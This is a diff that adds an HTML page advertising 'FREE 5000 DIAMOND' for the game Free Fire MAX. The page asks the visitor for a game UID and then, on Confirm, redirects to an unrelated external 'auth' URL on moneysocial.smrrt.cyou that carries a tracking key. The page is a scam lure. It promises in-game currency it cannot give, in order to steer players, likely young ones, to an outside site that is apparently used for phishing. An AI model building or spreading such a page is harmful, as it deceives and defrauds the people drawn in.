@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FREE DIAMOND</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    background: black;
+    font-family: Arial, sans-serif;
+
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+
+/* 🌈 FULL SCREEN BORDER */
+body::before {
+    content: "";
+    position: fixed;
+    inset: 0;
+    padding: 2px;
+
+    background: linear-gradient(270deg,
+        red, orange, yellow, green, cyan, blue, violet);
+    background-size: 400% 400%;
+    animation: rainbow 6s linear infinite;
+
+    -webkit-mask:
+        linear-gradient(#000 0 0) content-box,
+        linear-gradient(#000 0 0);
+    -webkit-mask-composite: xor;
+            mask-composite: exclude;
+
+    pointer-events: none;
+}
+
+/* ENTRY ANIMATION */
+.wrapper {
+    width: 320px;
+    animation: entry 0.8s ease;
+}
+
+@keyframes entry {
+    from {
+        opacity: 0;
+        transform: scale(0.8);
+    }
+    to {
+        opacity: 1;
+        transform: scale(1);
+    }
+}
+
+/* RAINBOW */
+@keyframes rainbow {
+    0% { background-position: 0% }
+    100% { background-position: 400% }
+}
+
+/* ===== THUMBNAIL ===== */
+.thumb-box {
+    padding: 2px;
+    border-radius: 15px;
+    background: linear-gradient(270deg,
+        red, orange, yellow, green, cyan, blue, violet);
+    background-size: 400% 400%;
+    animation: rainbow 6s linear infinite;
+    margin-bottom: 12px;
+}
+
+.thumbnail {
+    width: 100%;
+    aspect-ratio: 16/9;
+    border-radius: 13px;
+    overflow: hidden;
+    background: black;
+}
+
+.thumbnail img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+/* ===== DIAMOND BOX ===== */
+.diamond-box {
+    padding: 2px;
+    border-radius: 12px;
+    background: linear-gradient(270deg,
+        red, orange, yellow, green, cyan, blue, violet);
+    background-size: 400% 400%;
+    animation: rainbow 5s linear infinite;
+    margin-bottom: 12px;
+}
+
+.diamond-inner {
+    background: black;
+    padding: 10px;
+    border-radius: 10px;
+    text-align: center;
+    color: white;
+    font-weight: bold;
+
+    animation: pulseGlow 2s infinite alternate;
+}
+
+/* 💎 GLOW PULSE */
+@keyframes pulseGlow {
+    from {
+        text-shadow: 0 0 5px cyan;
+    }
+    to {
+        text-shadow: 0 0 20px cyan, 0 0 30px blue;
+    }
+}
+
+/* ===== MAIN BOX ===== */
+.box {
+    padding: 2px;
+    border-radius: 20px;
+    background: linear-gradient(270deg,
+        red, orange, yellow, green, cyan, blue, violet);
+    background-size: 400% 400%;
+    animation: rainbow 6s linear infinite;
+}
+
+.inner {
+    background: rgba(0,0,0,0.95);
+    padding: 20px;
+    border-radius: 18px;
+    text-align: center;
+    box-shadow: 0 0 25px cyan;
+}
+
+/* TITLE */
+.title {
+    color: white;
+    font-size: 18px;
+    font-weight: bold;
+    margin-bottom: 15px;
+    text-shadow: 0 0 10px cyan;
+}
+
+/* INPUT */
+input {
+    width: 100%;
+    padding: 12px;
+    border-radius: 12px;
+    border: 1px solid cyan;
+    background: transparent;
+    color: white;
+    text-align: center;
+    margin-bottom: 15px;
+    box-shadow: 0 0 15px cyan;
+}
+
+/* BUTTON */
+button {
+    width: 100%;
+    padding: 12px;
+    border-radius: 12px;
+    border: none;
+    font-size: 16px;
+    color: white;
+    cursor: pointer;
+
+    background: linear-gradient(270deg,
+        purple, blue, cyan);
+    box-shadow: 0 0 20px cyan;
+
+    transition: 0.2s;
+}
+
+/* 💥 CLICK EFFECT */
+button:active {
+    transform: scale(0.95);
+    box-shadow: 0 0 40px white;
+}
+
+/* HOVER */
+button:hover {
+    box-shadow: 0 0 30px white;
+}
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+
+    <!-- 🎬 THUMBNAIL -->
+    <div class="thumb-box">
+        <div class="thumbnail">
+            <img src="https://via.placeholder.com/640x360.png?text=YOUR+THUMBNAIL">
+        </div>
+    </div>
+
+    <!-- 💎 DIAMOND -->
+    <div class="diamond-box">
+        <div class="diamond-inner">💎 FREE 5000 DIAMOND 💎</div>
+    </div>
+
+    <!-- 🎮 UI -->
+    <div class="box">
+        <div class="inner">
+
+            <div class="title">FREE FIRE MAX</div>
+
+            <input type="text" placeholder="Enter UID" id="uid">
+
+            <button onclick="goToLink()">Confirm</button>
+
+        </div>
+    </div>
+
+</div>
+
+<script>
+function goToLink() {
+    let uid = document.getElementById("uid").value;
+
+    if(uid === "") {
+        alert("UID dal bhai 😄");
+        return;
+    }
+
+    window.location.href = "https://moneysocial.smrrt.cyou/auth/?way=3&key=hYZksbzg&fbclid=PAb21jcARa7_5leHRuA2FlbQIxMQBzcnRjBmFwcF9pZA81NjcwNjczNDMzNTI0MjcAAacSwPj0DtcsS6e5g8Oh_gHVMetaS2A0mbziJQVhklFpohMPfxjgYMZVLdt_UQ_aem_JlZNsvBhkpdcLCtoXjav1g";
+}
+</script>
+
+</body>
+</html>
